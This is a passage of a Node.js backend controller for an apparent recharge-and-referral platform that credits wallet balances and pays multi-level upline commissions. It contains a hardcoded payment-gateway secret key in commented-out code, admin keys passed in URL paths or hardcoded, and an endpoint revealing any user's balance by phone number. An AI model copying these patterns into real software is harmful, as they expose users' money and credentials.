    daySorted = `${day}`;
  }
  if (month < 10) {
    monthSorted = `0${month}`;
  } else {
    monthSorted = `${month}`;
  }
  const newDate = `${daySorted}-${monthSorted}-${year}`;
  const todayProfit = `${day}/${month}/${year}`;
  const getId = await Trans.findOne({
    id: clientId,

  });
  const getTransaction = await axios.post(
    "https://merchant.upigateway.com/api/check_order_status",
    {
      key: getId.key.key,
      client_txn_id: clientId,
      txn_date: newDate,
    }
  );
  if (getTransaction.data.status === true) {
    if (getTransaction.data.data.status === "success") {
      var amount = getTransaction.data.data.amount;
      const tempTran = await Trans.findOne({ id: clientId, status: "success" });
      if (!tempTran) {
        await Trans.updateOne(
          { id: clientId },
          { date: Date.now(), status: "success" }
        );

        // Credit Commission
        await creditCommission('PACKAGE_PURCHASE', parseInt(userId), amount, clientId);
        // Also check for KYC match (if logic requires it)
        await creditCommission('KYC_PAYMENT', parseInt(userId), amount, clientId);

        const lastTransId = await Trans.findOne(
          { id: clientId },
          { number: 1, userId: 1 }
        );
        //await Trans.create({id: clientId, date: Date.now(), userId, amount: amount});
        const user = await User.findOne({ id: userId });
        var firstRecharge = 0;
        await daily.updateOne(
          { id: newDate },
          { $inc: { count: +1, amount: amount } },
          { upsert: true }
        );

        if (!user.firstRecharge) {
          firstRecharge = amount;
          var bonusAmount = amount;

          const bonus = (amount * 10) / 100;
          bonusAmount = amount + bonus;
          await User.updateOne(
            { id: user.upLine[0] },
            {
              $inc: { balance: +100 },
              $push: {
                walletHistory: {
                  amount: 100,
                  date: Date.now(),
                  credit: true,
                  note: `Referal Reward User: ${user.id}`,
                },
              },
            }
          );
          const filedName = `todayProfit.${todayProfit}.referral`;
          await offerBonus.updateOne(
            { userId: user.upLine[0] },
            {
              userId: user.upLine[0],
              $inc: { amount: +100, [filedName]: +100, totalReferral: +100 },
              $push: {
                history: {
                  credit: "wallet",
                  amount: 100,
                  note: `Referal Reward User: ${user.id}`,
                  date: Date.now(),
                },
              },
            },
            { upsert: true }
          );




          await User.updateOne(
            { id: userId },
            {
              firstRecharge: true, $inc: { balance: +bonusAmount },
              $push: {
                rechargeHistory: {
                  amount: bonusAmount,
                  date: Date.now(),
                  status: "Success",
                },
                walletHistory: {
                  amount: bonusAmount,
                  date: Date.now(),
                  credit: true,
                  note: `Add money ID: ${lastTransId.number}`,
                },
              },
            }
          );

          // const level0profit = (amount * 3) /100;
          // const level1profit = (amount * 0) /100;
          // const level2profit = (amount * 0) /100;


          // user.upLine.forEach(async (element,index) => {
          //   if(index === 0){
          //     const fieldName = `todayProfit.${todayProfit}.level${index}`;
          //     const totallevel = `totalLevel${index}`;
          //     await User.updateOne(
          //     { id: element },
          //     {
          //       $inc: { balance: index === 0 ?level0profit : index === 1 ?  level1profit : level2profit  },

          //     }
          //   );
          //   await offerBonus.updateOne(
          //     { userId: element },
          //     {
          //       userId: element,
          //       $inc: { amount: index === 0 ?level0profit : index === 1 ?  level1profit : level2profit, [fieldName]:  index === 0 ?level0profit : index === 1 ?  level1profit : level2profit,[totallevel]: index === 0 ?level0profit : index === 1 ?  level1profit : level2profit },
          //       $push: {
          //         history: {
          //           credit: "wallet",
          //           amount: index === 0 ?level0profit : index === 1 ?  level1profit : level2profit,
          //           note: `Recharge bonus: ${user.id}`,
          //           date: Date.now(),
          //         },
          //       },
          //     },
          //     {upsert: true}
          //   );
          // }
          // });


        } else {

          var bonus;
          var bonusAmount = amount;
          if (amount > 200) {
            bonus = (amount * 3) / 100;
            bonusAmount = amount + bonus;
          }
          await User.updateOne(
            { id: userId },
            {
              firstRecharge: true, $inc: { balance: +bonusAmount },
              $push: {
                rechargeHistory: {
                  amount: bonusAmount,
                  date: Date.now(),
                  status: "Success",
                },
                walletHistory: {
                  amount: bonusAmount,
                  date: Date.now(),
                  credit: true,
                  note: `Add money ID: ${lastTransId.number}`,
                },
              },
            }
          );
          const level0profit = (amount * 3) / 100;
          const level1profit = (amount * 0) / 100;
          const level2profit = (amount * 0) / 100;

          user.upLine.forEach(async (element, index) => {
            if (index === 0) {
              const fieldName = `todayProfit.${todayProfit}.level${index}`;
              const totallevel = `totalLevel${index}`;
              await User.updateOne(
                { id: element },
                {
                  $inc: { balance: index === 0 ? level0profit : index === 1 ? level1profit : level2profit },

                }
              );
              await offerBonus.updateOne(
                { userId: element },
                {
                  userId: element,
                  $inc: { amount: index === 0 ? level0profit : index === 1 ? level1profit : level2profit, [fieldName]: index === 0 ? level0profit : index === 1 ? level1profit : level2profit, [totallevel]: index === 0 ? level0profit : index === 1 ? level1profit : level2profit },
                  $push: {
                    history: {
                      credit: "wallet",
                      amount: index === 0 ? level0profit : index === 1 ? level1profit : level2profit,
                      note: `Recharge bonus: ${user.id}`,
                      date: Date.now(),
                    },
                  },
                },
                { upsert: true }
              );
            }
          });

        }
        const userDate = new Date(user.date);
        const userDateLocal = (userDate / 1000 + 19800) * 1000;
        const newuserDate = new Date(userDateLocal);
        const abhiDate = new Date();
        const abhiDateLocal = (abhiDate / 1000 + 19800) * 1000;
        const newabhirDate = new Date(abhiDateLocal);
        const day = newabhirDate.getDate();
        const month = newabhirDate.getMonth() + 1;
        const year = newabhirDate.getFullYear();
        const dayMonth = `${day}/${month}/${year}`;

        const userday = newuserDate.getDate();
        const usermonth = newuserDate.getMonth() + 1;
        const userdayMonth = `${userday}/${usermonth}/${year}`;
        const newphone0recharge = `newlevel0.${dayMonth}.${user.phone}.todayRecharge`;
        const newphone1recharge = `newlevel1.${dayMonth}.${user.phone}.todayRecharge`;
        const newphone2recharge = `newlevel2.${dayMonth}.${user.phone}.todayRecharge`;
        const newphone3recharge = `newlevel3.${dayMonth}.${user.phone}.todayRecharge`;
        const newphone4recharge = `newlevel4.${dayMonth}.${user.phone}.todayRecharge`;
        const newphone5recharge = `newlevel5.${dayMonth}.${user.phone}.todayRecharge`;
        const newphone6recharge = `newlevel6.${dayMonth}.${user.phone}.todayRecharge`;


        const phone0recharge = `level0.${user.phone}.totalRecharge`;
        const phone1recharge = `level1.${user.phone}.totalRecharge`;
        const phone2recharge = `level2.${user.phone}.totalRecharge`;
        const phone3recharge = `level3.${user.phone}.totalRecharge`;
        const phone4recharge = `level4.${user.phone}.totalRecharge`;
        const phone5recharge = `level5.${user.phone}.totalRecharge`;
        const phone6recharge = `level6.${user.phone}.totalRecharge`;

        const phone0first = `level0.${user.phone}.firstRecharge`;
        const phone1first = `level1.${user.phone}.firstRecharge`;
        const phone2first = `level2.${user.phone}.firstRecharge`;
        const phone3first = `level3.${user.phone}.firstRecharge`;
        const phone4first = `level4.${user.phone}.firstRecharge`;
        const phone5first = `level5.${user.phone}.firstRecharge`;
        const phone6first = `level6.${user.phone}.firstRecharge`;

        if (dayMonth === userdayMonth) {
          if (user.upLine !== null) {
            // Level 0
            if (user.upLine[0]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[0] },
                {
                  userId: user.upLine[0],
                  $inc: {
                    [newphone0recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }

            // Level 1
            if (user.upLine[1]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[1] },
                {
                  userId: user.upLine[1],
                  $inc: {
                    [newphone1recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }

            // Level 2
            if (user.upLine[2]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[2] },
                {
                  userId: user.upLine[2],
                  $inc: {
                    [newphone2recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }

            // Level 3
            if (user.upLine[3]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[3] },
                {
                  userId: user.upLine[3],
                  $inc: {
                    [newphone3recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }

            // Level 4
            if (user.upLine[4]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[4] },
                {
                  userId: user.upLine[4],
                  $inc: {
                    [newphone4recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }

            // Level 5
            if (user.upLine[5]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[5] },
                {
                  userId: user.upLine[5],
                  $inc: {
                    [newphone5recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }

            // Level 6
            if (user.upLine[6]?.length > 0) {
              await promotion.updateOne(
                { userId: user.upLine[6] },
                {
                  userId: user.upLine[6],
                  $inc: {
                    [newphone6recharge]: amount,
                  },
                },
                { upsert: true }
              );
            }
          }
        }

        if (user.upLine !== null) {
          // Level 0
          if (user.upLine[0]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[0] },
              {
                userId: user.upLine[0],
                $inc: {
                  [phone0first]: firstRecharge,
                  [phone0recharge]: amount,
                },
              },
              { upsert: true }
            );
          }

          // Level 1
          if (user.upLine[1]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[1] },
              {
                userId: user.upLine[1],
                $inc: {
                  [phone1first]: firstRecharge,
                  [phone1recharge]: amount,
                },
              },
              { upsert: true }
            );
          }

          // Level 2
          if (user.upLine[2]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[2] },
              {
                userId: user.upLine[2],
                $inc: {
                  [phone2first]: firstRecharge,
                  [phone2recharge]: amount,
                },
              },
              { upsert: true }
            );
          }

          // Level 3
          if (user.upLine[3]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[3] },
              {
                userId: user.upLine[3],
                $inc: {
                  [phone3first]: firstRecharge,
                  [phone3recharge]: amount,
                },
              },
              { upsert: true }
            );
          }

          // Level 4
          if (user.upLine[4]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[4] },
              {
                userId: user.upLine[4],
                $inc: {
                  [phone4first]: firstRecharge,
                  [phone4recharge]: amount,
                },
              },
              { upsert: true }
            );
          }

          // Level 5
          if (user.upLine[5]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[5] },
              {
                userId: user.upLine[5],
                $inc: {
                  [phone5first]: firstRecharge,
                  [phone5recharge]: amount,
                },
              },
              { upsert: true }
            );
          }

          // Level 6
          if (user.upLine[6]?.length > 0) {
            await promotion.updateOne(
              { userId: user.upLine[6] },
              {
                userId: user.upLine[6],
                $inc: {
                  [phone6first]: firstRecharge,
                  [phone6recharge]: amount,
                },
              },
              { upsert: true }
            );
          }
        }
        res.redirect("https://winkaro.online/rechargeHistory");
      } else {
        res.redirect("https://winkaro.online");
      }
    } else {
      res.redirect("https://winkaro.online");
    }
  } else {
    res.redirect("https://winkaro.online");
  }
};


//  export const payUMoneyPayment = (req, res) => {
//   var getData = req.body;
//   const txnId = crypto.randomBytes(16).toString("hex");
//   if (!req.body.amount || !req.body.productinfo
//        || !req.body.firstname || !req.body.email) {
//          res.send("Mandatory fields missing");
//    } else {
//     console.log(getData);
//     const cryp = crypto.createHash('sha512');
//     const text = process.env.KEY+'|'+txnId+'|'+getData.amount+'|'+getData.productinfo+'|'+getData.firstname+'|'+getData.email+ '|' + '||||||||||'+process.env.SALT;
//     cryp.update(text);
//     const hash =  cryp.digest('hex');

//         //  var getData = req.body;
//         //  console.log(getData);
//         //  const hashString = process.env.KEY
//         //   + '|' + txnId
//         //   + '|' + getData.amount
//         //   + '|' + getData.productinfo
//         //   + '|' + getData.firstname
//         //   + '|' + getData.email
//         //   + '|' + '||||||||||'
//         //   + process.env.SALT;

//         //  var sha = new jsSHA('SHA-512', "TEXT");
//         //  sha.update(hashString)
//         //  var hash = sha.getHash("HEX");
//          console.log(hash);
//          res.send({ 'hash': hash, 'txnid': txnId});
//    }
// }

// export const payUMoneyPaymentResponse =  async(req, res)  => {
//   const userId = parseInt(req.params.id);
//   var pd = req.body;
//   //Generate new Hash

//    var hashString = process.env.SALT + '|' + pd.status + '||||||||||' + '|' + pd.email + '|' + pd.firstname + '|' + pd.productinfo + '|' + pd.amount + '|' + pd.txnid + '|' + process.env.KEY
//    const cryp = crypto.createHash('sha512');
//    cryp.update(hashString);
//    const calchash = cryp.digest('hex');
//    // Verify the new hash with the hash value in response
//    if (calchash == pd.hash) {
//       if(pd.status === 'success'){
//         const tempTran = await Trans.findOne({id: pd.txnid});
//         if(!tempTran){
//           await Trans.create({id: pd.txnid, date: Date.now(), userId, amount: pd.amount});
//           var amount = parseInt(pd.amount);
//           const user = await User.findOne({id: userId});
//         if(!user.firstRecharge){
//           await User.updateOne({id: user.upLine[0]},{$inc: {'balance': +150}});
//                 if(amount > 4999){
//                     const bonus = amount * 10/100;
//                     amount = amount + bonus;
//                 }
//         }
//         await User.updateOne({id: userId}, {firstRecharge: true, $inc: {'balance': +amount}});
//         await User.updateOne({id: userId}, {$push: {'rechargeHistory': {amount: amount,date: Date.now(),status: 'Success'}}});
//         res.redirect('https://thegooe.com/rechargeHi
//         }else{
//           res.redirect('https://thegooe.com');
//         }

//       }else{
//         res.status(400).send({status: 'fail'});

//       }

//    } else {
//     res.status(400).send({status: 'fail'});
//    }
// }

// export const worldLineHash = async(req, res) => {
//   const data = req.body;
//   var txnId = 'svsfve23123cd';
//   var hashString = `${process.env.WORLD_ID}|${txnId}|${data.amount}||${data.userId}|${data.phone}|${data.email}||||||||||${process.env.WORLD_SALT}`
//   var hash = sha256(hashString);
//   console.log(hash);
//   return res.json({'hash': hash, 'txnId': txnId});
// }

// export const worldLineResponse = async(req, res) => {
//  const data = req.body;
//  console.log(data);
// }

// export const cashFreePaymentGateway = async(req,res)=>{
//   var orderId = "order"+Math.floor((Math.random() * 10000000000000) + 1);
//  var postData = {
//     "appId" : '174431840fd789a8f5cc26e1d3134471',
//     "orderId" : orderId,
//     "orderAmount" : req.body.amount,
//     "orderCurrency" : "INR",
//     "orderNote" : req.body.orderNote,
//     'customerName' : req.body.name,
//     "customerEmail" : req.body.email,
//     "customerPhone" : req.body.phone,
//     "returnUrl" : req.body.returnUrl
//   },
//   mode = "PROD",
//   secretKey = "77b0d09b5dc2d9e2617830a10588181b4e8946ca",
//   sortedkeys = Object.keys(postData),
//   url="",
//   signatureData = "";
//   sortedkeys.sort();
//   for (var i = 0; i < sortedkeys.length; i++) {
//     var k = sortedkeys[i];
//     signatureData += k + postData[k];
//   }
//   var signature = crypto.createHmac('sha256',secretKey).update(signatureData).digest('base64');
//   postData['signature'] = signature;
//   if (mode == "PROD") {
//     url = "https://www.cashfree.com/checkout/post/submit";
//   } else {
//     url = "https://test.cashfree.com/billpay/checkout/post/submit";
//   }
//   res.json({'request':postData ,'url' : url});
// }
// export const returnCashFreePayment = async(req,res)=>{
//   const userId = parseInt(req.params.id);
//   var postData = {
//     "orderId" : req.body.orderId,
//     "orderAmount" : req.body.orderAmount,
//     "referenceId" : req.body.referenceId,
//     "txStatus" : req.body.txStatus,
//     "paymentMode" : req.body.paymentMode,
//     "txMsg" : req.body.txMsg,
//     "txTime" : req.body.txTime
//    },
//   secretKey = "77b0d09b5dc2d9e2617830a10588181b4e8946ca",

//   signatureData = "";
//   for (var key in postData) {
//     signatureData +=  postData[key];
//   }
//   var computedsignature = crypto.createHmac('sha256',secretKey).update(signatureData).digest('base64');
//   postData['signature'] = req.body.signature;
//   postData['computedsignature'] = computedsignature;
//    if (postData.signature == postData.computedsignature) {
//       if(postData.txStatus === 'SUCCESS'){
//         var amount = parseInt(postData.orderAmount);
//        const user = await User.findOne({id: userId});
//         if(!user.firstRecharge){
//           await User.updateOne({id: user.upLine[0]},{$inc: {'balance': +150}});
//                 if(amount > 4999){
//                     const bonus = amount * 10/100;
//                     amount = amount + bonus;
//                 }
//         }
//         await User.updateOne({id: userId}, {firstRecharge: true, $inc: {'balance': +amount}});
//         await User.updateOne({id: userId}, {$push: {'rechargeHistory': {amount: amount,date: Date.now(),status: 'Success'}}});
//         res.redirect('https://www.thegooe.com/preOrder/success');
//       }else{
//         res.redirect('https://www.thegooe.com/preOrder/fail');

//       }

//    } else {
//     res.redirect('https://www.thegooe.com/preOrder/fail');
//    }
//   // res.json({'response':postData});
// }

export const oldPromotion = async (req, res) => {
  const id = req.params.id;

  const getOldData = await promotion.findOne({ userId: id });
  res.status(200).send(getOldData);
};

export const promotionMembers = async (req, res) => {
  const id = req.params.id;
  var level0 = { current: 0, active: 0 };
  var level1 = { current: 0, active: 0 };
  var level2 = { current: 0, active: 0 };
  var level3 = { current: 0, active: 0 };
  var level4 = { current: 0, active: 0 };
  var level5 = { current: 0, active: 0 };
  var level6 = { current: 0, active: 0 };
  const date = new Date();
  const localDate = (date / 1000 + 19800) * 1000;
  const newDate = new Date(localDate);
  const dateFormated = `${newDate.getDate() + "/" + (newDate.getMonth() + 1) + "/" + newDate.getFullYear()}`;
  const getData = await promotion.findOne({ userId: id },);
  if (getData) {
    if (getData.level0) {

      level0 = { active: 0, total: Object.keys(getData.level0).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][0]) {
            level0 = { active: getData.activeMembers[`${dateFormated}`][0].length, total: Object.keys(getData.level0).length };
          }
        }
      }
    }
    if (getData.level1) {
      level1 = { active: 0, total: Object.keys(getData.level1).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][1]) {
            level1 = { active: getData.activeMembers[`${dateFormated}`][1].length, total: Object.keys(getData.level1).length };
          }
        }
      }
    }
    if (getData.level2) {
      level2 = { active: 0, total: Object.keys(getData.level2).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][2]) {
            level2 = { active: getData.activeMembers[`${dateFormated}`][2].length, total: Object.keys(getData.level2).length };
          }
        }
      }
    }
    if (getData.level3) {
      level3 = { active: 0, total: Object.keys(getData.level3).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][3]) {
            level3 = { active: getData.activeMembers[`${dateFormated}`][3].length, total: Object.keys(getData.level3).length };
          }
        }
      }
    }
    if (getData.level4) {
      level4 = { active: 0, total: Object.keys(getData.level4).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][4]) {
            level4 = { active: getData.activeMembers[`${dateFormated}`][4].length, total: Object.keys(getData.level4).length };
          }
        }
      }
    }
    if (getData.level5) {
      level5 = { active: 0, total: Object.keys(getData.level5).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][5]) {
            level5 = { active: getData.activeMembers[`${dateFormated}`][5].length, total: Object.keys(getData.level5).length };
          }
        }
      }
    }
    if (getData.level6) {
      level6 = { active: 0, total: Object.keys(getData.level6).length };
      if (getData.activeMembers) {
        if (`${dateFormated}` in getData.activeMembers) {
          if (getData.activeMembers[`${dateFormated}`][6]) {
            level6 = { active: getData.activeMembers[`${dateFormated}`][6].length, total: Object.keys(getData.level6).length };
          }
        }
      }
    }
  }
  res.status(200).send({ level1, level0, level2, level3, level4, level5, level6 });
};

export const newPromotion = async (req, res) => {
  const id = req.params.id;
  var level0 = {};
  var level1 = {};
  var level2 = {};
  var level3 = {};
  var level4 = {};
  var level5 = {};
  var level6 = {};


  const getOldData = await promotion.findOne({ userId: id });
  if (getOldData) {
    const date = new Date();
    const localDate = (date / 1000 + 19800) * 1000;
    const newDate = new Date(localDate);
    const day = newDate.getDate();
    const month = newDate.getMonth() + 1;
    const year = newDate.getFullYear();
    const dayMonth = `${day}/${month}/${year}`;
    if (
      getOldData.newlevel0 &&
      getOldData.newlevel0[dayMonth] &&
      getOldData.newlevel0[dayMonth]
    ) {
      level0 = getOldData.newlevel0[dayMonth];
    }
    if (
      getOldData.newlevel1 &&
      getOldData.newlevel1[dayMonth] &&
      getOldData.newlevel1[dayMonth]
    ) {
      level1 = getOldData.newlevel1[dayMonth];
    }
    if (
      getOldData.newlevel2 &&
      getOldData.newlevel2[dayMonth] &&
      getOldData.newlevel2[dayMonth]
    ) {
      level2 = getOldData.newlevel2[dayMonth];
    }
    if (
      getOldData.newlevel3 &&
      getOldData.newlevel3[dayMonth] &&
      getOldData.newlevel3[dayMonth]
    ) {
      level3 = getOldData.newlevel3[dayMonth];
    }
    if (
      getOldData.newlevel4 &&
      getOldData.newlevel4[dayMonth] &&
      getOldData.newlevel4[dayMonth]
    ) {
      level4 = getOldData.newlevel4[dayMonth];
    }
    if (
      getOldData.newlevel5 &&
      getOldData.newlevel5[dayMonth] &&
      getOldData.newlevel5[dayMonth]
    ) {
      level5 = getOldData.newlevel5[dayMonth];
    }
    if (
      getOldData.newlevel6 &&
      getOldData.newlevel6[dayMonth] &&
      getOldData.newlevel6[dayMonth]
    ) {
      level6 = getOldData.newlevel6[dayMonth];
    }

  }
  res.status(200).send({ level0, level1, level2, level3, level4, level5, level6 });
};
export const getPromotionLiveBalance = async (req, res) => {
  const id = req.params.id;
  const phone = req.params.phone;
  var amount = 0;

  var user = await User.findOne({ phone }, { balance: 1, upLine: 1 });
  if (user.upLine.includes(id)) {
    amount = user.balance;
  }
  res.status(200).send({ phone: phone, amount });
};

export const setServerDown = async (req, res) => {
  const id = req.params.id;
  const api = req.params.api;
  const down = req.params.down;
  if (api === process.env.AdminAPI) {
    if (down === "true") {
      await User.updateOne({ id }, { temp: true });
    } else {
      await User.updateOne({ id }, { temp: false });
    }
  }
  res.status(200).send("done");
};
export const setServerDownLevel = async (req, res) => {
  const id = req.params.id;
  const api = req.params.api;
  const down = req.params.down;
  if (api === process.env.AdminAPI) {
    if (down === "true") {
      await User.updateOne({ id }, { levelDown: true });
    } else {
      await User.updateOne({ id }, { levelDown: false });
    }
  }
  res.status(200).send("done");
};
export const viewDownUsers = async (req, res) => {
  var users = [];
  const api = req.params.api;

  if (api === process.env.AdminAPI) {
    users = await User.find({ temp: true }, { id: 1, phone: 1, balance: 1 });
  }
  res.status(200).send(users);
};

export const migrateOldPromotion = async (req, res) => {
  const api = req.params.id;

  if (api === "eyjdvbchgdvc") {
    // const getWith = await withdrawal.find({id: {$gt: 5911}});
    // for(const element of getWith){
    //   if(element.status === 'Success'){
    //   console.log(element.id);
    //   var amount = element.amount;
    //   const user = await User.findOne({id:element.userId});
    //   const date = new Date();
    //   const localDate = (date / 1000 + 19800) * 1000;
    //   const newDatefor = new Date(localDate);
    //   const day = newDatefor.getDate();
    //   const month = newDatefor.getMonth() + 1;
    //   const userDate = new Date(user.date);
    //   const userDateLocal = (userDate / 1000 + 19800) * 1000;
    //   const newuserDate = new Date(userDateLocal);
    //   const dayMonth = `${day}/${month}`;
    //   const userday = newuserDate.getDate();
    //   const usermonth = newuserDate.getMonth() + 1;
    //   const userdayMonth = `${userday}/${usermonth}`;
    //   const phone0with = `level0.${user.phone}.totalWithdrawal`;
    //   const phone1with = `level1.${user.phone}.totalWithdrawal`;
    //   const phone2with = `level2.${user.phone}.totalWithdrawal`;
    //   const newphone0with = `newlevel0.${dayMonth}.${user.phone}.todayWithdrawal`;
    //   const newphone1with = `newlevel1.${dayMonth}.${user.phone}.todayWithdrawal`;
    //   const newphone2with = `newlevel2.${dayMonth}.${user.phone}.todayWithdrawal`;
    //   if(dayMonth === userdayMonth){
    //     console.log(`new -- ${user.id}`);
    //     if (user.upLine !== null) {
    //       if (user.upLine[0].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: user.upLine[0] ?? 1 },
    //           {
    //             userId: user.upLine[0] ?? 1,
    //             $inc: {
    //               [newphone0with]: parseInt(amount),
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //       if (user.upLine.length === 2) {
    //         if (user.upLine[1].length !== 0) {
    //           await promotion.updateOne(
    //             { userId: user.upLine[1] ?? 1 },
    //             {
    //               userId: user.upLine[1] ?? 1,
    //               $inc: {
    //                 [newphone1with]: parseInt(amount),
    //               },
    //             },
    //             { upsert: true }
    //           );
    //         }
    //       }
    //       if (user.upLine.length === 3) {
    //         if (user.upLine[1].length !== 0) {
    //           await promotion.updateOne(
    //             { userId: user.upLine[1] ?? 1 },
    //             {
    //               userId: user.upLine[1] ?? 1,
    //               $inc: {
    //                 [newphone1with]: parseInt(amount),
    //               },
    //             },
    //             { upsert: true }
    //           );
    //         }
    //         if (user.upLine[2].length !== 0) {
    //           await promotion.updateOne(
    //             { userId: user.upLine[2] ?? 1 },
    //             {
    //               userId: user.upLine[2] ?? 1,
    //               $inc: {
    //                 [newphone2with]: parseInt(amount) ,
    //               },
    //             },
    //             { upsert: true }
    //           );
    //         }
    //       }
    //     }
    //   }
    //      if (user.upLine !== null) {
    //     if (user.upLine[0].length !== 0) {
    //       await promotion.updateOne(
    //         { userId: user.upLine[0] ?? 1 },
    //         {
    //           userId: user.upLine[0] ?? 1,
    //           $inc: {
    //             [phone0with]: element.amount,
    //           },
    //         },
    //         { upsert: true }
    //       );
    //     }
    //     if (user.upLine.length === 2) {
    //       if (user.upLine[1].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: user.upLine[1] ?? 1 },
    //           {
    //             userId: user.upLine[1] ?? 1,
    //             $inc: {
    //               [phone1with]: element.amount,
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //     }
    //     if (user.upLine.length === 3) {
    //       if (user.upLine[1].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: user.upLine[1] ?? 1 },
    //           {
    //             userId: user.upLine[1] ?? 1,
    //             $inc: {
    //               [phone1with]: element.amount,
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //       if (user.upLine[2].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: user.upLine[2] ?? 1 },
    //           {
    //             userId: user.upLine[2] ?? 1,
    //             $inc: {
    //               [phone2with]: element.amount ,
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //     }
    //   }
    // }
    // }
    // const getuser = await User.find(
    //   {id: {$gt: 26837}},
    //   { phone: 1, id: 1, rechargeHistory: 1, upLine: 1, firstRecharge: 1 }
    // );
    // for (const element of getuser) {
    //   if(element.id <= 27066){
    //   console.log(element.id);
    //   const phone0recharge = `level0.${element.phone}.totalRecharge`;
    //   const phone1recharge = `level1.${element.phone}.totalRecharge`;
    //   const phone2recharge = `level2.${element.phone}.totalRecharge`;
    //   const phone0with = `level0.${element.phone}.totalWithdrawal`;
    //   const phone1with = `level1.${element.phone}.totalWithdrawal`;
    //   const phone2with = `level2.${element.phone}.totalWithdrawal`;
    //   const phone0first = `level0.${element.phone}.firstRecharge`;
    //   const phone1first = `level1.${element.phone}.firstRecharge`;
    //   const phone2first = `level2.${element.phone}.firstRecharge`;
    //   var firstRecharge = 0;
    //   var totalWithdrawal = 0;
    //   var totalRecharge = 0;
    //   //const getWith = await withdrawal.find({ userId: element.id });
    //   // getWith.forEach((elementWith) => {
    //   //   if (elementWith.status === "Success") {
    //   //     totalWithdrawal += parseInt(elementWith.amount);
    //   //   }
    //   // });
    //   if (!element.firstRecharge) {
    //   if (element.upLine !== null) {
    //     if (element.upLine[0].length !== 0) {
    //       await promotion.updateOne(
    //         { userId: element.upLine[0] ?? 1 },
    //         {
    //           userId: element.upLine[0] ?? 1,
    //           $inc: {
    //             [phone0first]: firstRecharge,
    //             [phone0recharge]: totalRecharge,
    //             [phone0with]: totalWithdrawal,
    //           },
    //         },
    //         { upsert: true }
    //       );
    //     }
    //     if (element.upLine.length === 2) {
    //       if (element.upLine[1].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: element.upLine[1] ?? 1 },
    //           {
    //             userId: element.upLine[1] ?? 1,
    //             $inc: {
    //               [phone1first]: firstRecharge,
    //               [phone1recharge]: totalRecharge,
    //               [phone1with]: totalWithdrawal,
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //     }
    //     if (element.upLine.length === 3) {
    //       if (element.upLine[1].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: element.upLine[1] ?? 1 },
    //           {
    //             userId: element.upLine[1] ?? 1,
    //             $inc: {
    //               [phone1first]: firstRecharge,
    //               [phone1recharge]: totalRecharge,
    //               [phone1with]: totalWithdrawal,
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //       if (element.upLine[2].length !== 0) {
    //         await promotion.updateOne(
    //           { userId: element.upLine[2] ?? 1 },
    //           {
    //             userId: element.upLine[2] ?? 1,
    //             $inc: {
    //               [phone2first]: firstRecharge,
    //               [phone2recharge]: totalRecharge,
    //               [phone2with]: totalWithdrawal,
    //             },
    //           },
    //           { upsert: true }
    //         );
    //       }
    //     }
    //   }
    // }
    // }
    // }
    // const getAllUsers = await User.find();
    // for (const element of getAllUsers){
    //   console.log(element.id);
    //   //level0
    //   var level0Data = new Map();
    //   var level1Data = new Map();
    //   var level2Data = new Map();
    //   for (const level0 of element.level0){
    //    const level0Member = await User.findOne({phone: level0.mobile});
    //    if(level0Member){
    //    var firstRecharge = 0;
    //    var totalRecharge = 0;
    //    var totalWith = 0;
    //    if(level0Member.rechargeHistory.lenght > 0){
    //     firstRecharge = rechargeHistory[0].amount;
    //    }
    //    level0Member.rechargeHistory.forEach(recharge => {
    //     totalRecharge += parseInt(recharge.amount);
    //    });
    //    const getAllWithdrawal = await withdrawal.find({userId: level0Member.id});
    //    for(const allWith of getAllWithdrawal){
    //     if(allWith.status === 'Success'){
    //        totalWith += allWith.amount;
    //     }
    //    }
    //    const level0Phone = level0.mobile;
    //    level0Data.set(level0Phone, {firstRecharge,totalRecharge,totalWithdrawal: totalWith});
    //   }
    //   }
    //   //level1
    //   for (const level1 of element.level1){
    //     const level1Member = await User.findOne({phone: level1.mobile});
    //     if(level1Member){
    //     var totalRecharge = 0;
    //     var totalWith = 0;
    //     var firstRecharge = 0;
    //     if(level1Member.rechargeHistory.length > 0){
    //       firstRecharge = level1Member.rechargeHistory[0].amount;
    //      }
    //     level1Member.rechargeHistory.forEach(recharge => {
    //      totalRecharge += parseInt(recharge.amount);
